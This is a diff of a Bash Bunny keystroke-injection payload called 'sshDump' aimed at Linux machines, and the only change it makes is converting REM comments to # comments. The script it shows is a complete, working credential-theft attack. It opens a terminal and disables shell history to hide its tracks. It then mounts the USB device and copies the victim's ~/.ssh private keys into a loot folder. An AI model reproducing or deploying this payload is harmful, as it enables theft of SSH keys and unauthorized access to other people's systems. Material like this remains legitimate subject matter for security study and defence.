@@ -1,10 +1,10 @@
-REM Title: sshDump
-REM Description: Taking advantage of plain stored ssh private keys in home dir, sshDump grabs them for you.
-REM AUTHOR: drapl0n
-REM Version: 1.0
-REM Category: Credentials
-REM Target: GNU/Linux.
-REM Attackmodes: HID, Storage.
+# Title: sshDump
+# Description: Taking advantage of plain stored ssh private keys in home dir, sshDump grabs them for you.
+# AUTHOR: drapl0n
+# Version: 1.0
+# Category: Credentials
+# Target: GNU/Linux.
+# Attackmodes: HID, Storage.
 
 LED SETUP
 ATTACKMODE STORAGE HID
@@ -14,12 +14,12 @@ Q DELAY 1000
 Q CTRL-ALT t
 Q DELAY 1000
 
-REM [Prevent storing history]
+# [Prevent storing history]
 Q STRING unset HISTFILE
 Q ENTER
 Q DELAY 200
 
-REM [Fetching BashBunny's block device]
+# [Fetching BashBunny's block device]
 Q STRING lol='$(lsblk | grep 1.8G)'
 Q ENTER
 Q DELAY 100
@@ -27,7 +27,7 @@ Q STRING disk='$(echo $lol | awk '\'{print\ '$1'}\'\)''
 Q ENTER
 Q DELAY 200
 
-REM [Mounting BashBunny]
+# [Mounting BashBunny]
 Q STRING udisksctl mount -b /dev/'$disk' /tmp/tmppp
 Q ENTER
 Q DELAY 2000
@@ -35,12 +35,12 @@ Q STRING mntt='$(lsblk | grep $disk | awk '\'{print\ '$7'}\'\)''
 Q ENTER
 Q DELAY 500
 
-REM [Looting]
+# [Looting]
 Q STRING cp -r '~/.ssh' '$mntt/loot/SSH'
 Q ENTER
 Q DELAY 2000
 
-REM [Unmounting BashBunny]
+# [Unmounting BashBunny]
 Q STRING udisksctl unmount -b /dev/'$disk'
 Q ENTER
 Q DELAY 500
